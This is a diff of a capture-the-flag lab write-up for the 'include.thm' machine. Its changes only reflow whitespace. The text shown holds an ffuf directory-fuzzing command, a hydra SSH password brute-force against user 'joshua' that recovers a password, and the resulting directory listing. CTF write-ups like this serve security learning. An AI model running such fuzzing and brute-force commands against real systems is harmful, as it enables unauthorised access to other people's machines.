@@ -6,16 +6,16 @@
 ## OPEN PORTS
 ---
 
-| PORT      | SERVICE |
+| PORT | SERVICE |
 | --------- | ------- |
-| 22/tcp    | ssh     |
-| 25/tcp    | smtp    |
-| 110/tcp   | pop3    |
-| 143/tcp   | imap    |
-| 993/tcp   | imaps   |
-| 995/tcp   | pop3s   |
-| 4000/tcp  | http    |
-| 50000/tcp | http    |
+| 22/tcp | ssh |
+| 25/tcp | smtp |
+| 110/tcp | pop3 |
+| 143/tcp | imap |
+| 993/tcp | imaps |
+| 995/tcp | pop3s |
+| 4000/tcp | http |
+| 50000/tcp | http |
 
 
 # RECONNAISSANCE
@@ -117,39 +117,39 @@ If we fuzz this page, we can find this:
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://include.thm:50000/FUZZ" -ic -c -t 200 -e .php
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://include.thm:50000/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
- :: Extensions       : .php
+ :: Method : GET
+ :: URL : http://include.thm:50000/FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Extensions : .php
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-uploads                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 177ms]
-templates               [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 5177ms]
-index.php               [Status: 200, Size: 1611, Words: 256, Lines: 32, Duration: 6196ms]
-.php                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 6205ms]
-profile.php             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 7248ms]
-login.php               [Status: 200, Size: 2044, Words: 338, Lines: 48, Duration: 7249ms]
-api.php                 [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 178ms]
-javascript              [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 177ms]
-logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 180ms]
-auth.php                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 183ms]
-dashboard.php           [Status: 302, Size: 1225, Words: 201, Lines: 28, Duration: 176ms]
-phpmyadmin              [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 179ms]
+uploads [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 177ms]
+templates [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 5177ms]
+index.php [Status: 200, Size: 1611, Words: 256, Lines: 32, Duration: 6196ms]
+.php [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 6205ms]
+profile.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 7248ms]
+login.php [Status: 200, Size: 2044, Words: 338, Lines: 48, Duration: 7249ms]
+api.php [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 178ms]
+javascript [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 177ms]
+logout.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 180ms]
+auth.php [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 183ms]
+dashboard.php [Status: 302, Size: 1225, Words: 201, Lines: 28, Duration: 176ms]
+phpmyadmin [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 179ms]
 ```
 
 
@@ -251,7 +251,7 @@ We got an user named `joshua`, let's bruteforce our way in:
 
 ```
 hydra -l joshua -P /usr/share/wordlists/rockyou.txt include.thm ssh
-[22][ssh] host: include.thm   login: joshua   password: 123456
+[22][ssh] host: include.thm login: joshua password: 123456
 ```
 
 We can now go in ssh:
@@ -264,19 +264,19 @@ We can now go into `/var/www/html` and get the flag:
 ```
 joshua@filepath:/var/www/html$ ls -la
 total 52
-drwxr-xr-x 4 ubuntu ubuntu 4096 Mar 12  2024 .
-drwxr-xr-x 3 root   root   4096 Nov 10  2021 ..
--rw-rw-r-- 1 ubuntu ubuntu  351 Feb 21  2024 .htaccess
--rw-rw-r-- 1 ubuntu ubuntu   38 Feb 22  2024 505eb0fb8a9f32853b4d955e1f9123ea.txt
--rw-rw-r-- 1 ubuntu ubuntu  257 Feb 23  2023 api.php
--rw-rw-r-- 1 ubuntu ubuntu  932 Feb 26  2024 auth.php
--rw-rw-r-- 1 ubuntu ubuntu 3504 Feb 21  2024 dashboard.php
--rw-rw-r-- 1 ubuntu ubuntu  429 Feb 21  2024 index.php
--rw-rw-r-- 1 ubuntu ubuntu 1000 Feb 20  2024 login.php
--rw-rw-r-- 1 ubuntu ubuntu   81 Nov  5  2023 logout.php
--rw-rw-r-- 1 ubuntu ubuntu  444 Mar 12  2024 profile.php
-drwxrwxr-x 2 ubuntu ubuntu 4096 Mar 12  2024 templates
-drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 20  2024 uploads
+drwxr-xr-x 4 ubuntu ubuntu 4096 Mar 12 2024 .
+drwxr-xr-x 3 root root 4096 Nov 10 2021 ..
+-rw-rw-r-- 1 ubuntu ubuntu 351 Feb 21 2024 .htaccess
+-rw-rw-r-- 1 ubuntu ubuntu 38 Feb 22 2024 505eb0fb8a9f32853b4d955e1f9123ea.txt
+-rw-rw-r-- 1 ubuntu ubuntu 257 Feb 23 2023 api.php
+-rw-rw-r-- 1 ubuntu ubuntu 932 Feb 26 2024 auth.php
+-rw-rw-r-- 1 ubuntu ubuntu 3504 Feb 21 2024 dashboard.php
+-rw-rw-r-- 1 ubuntu ubuntu 429 Feb 21 2024 index.php
+-rw-rw-r-- 1 ubuntu ubuntu 1000 Feb 20 2024 login.php
+-rw-rw-r-- 1 ubuntu ubuntu 81 Nov 5 2023 logout.php
+-rw-rw-r-- 1 ubuntu ubuntu 444 Mar 12 2024 profile.php
+drwxrwxr-x 2 ubuntu ubuntu 4096 Mar 12 2024 templates
+drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 20 2024 uploads
 ```
 
 ```
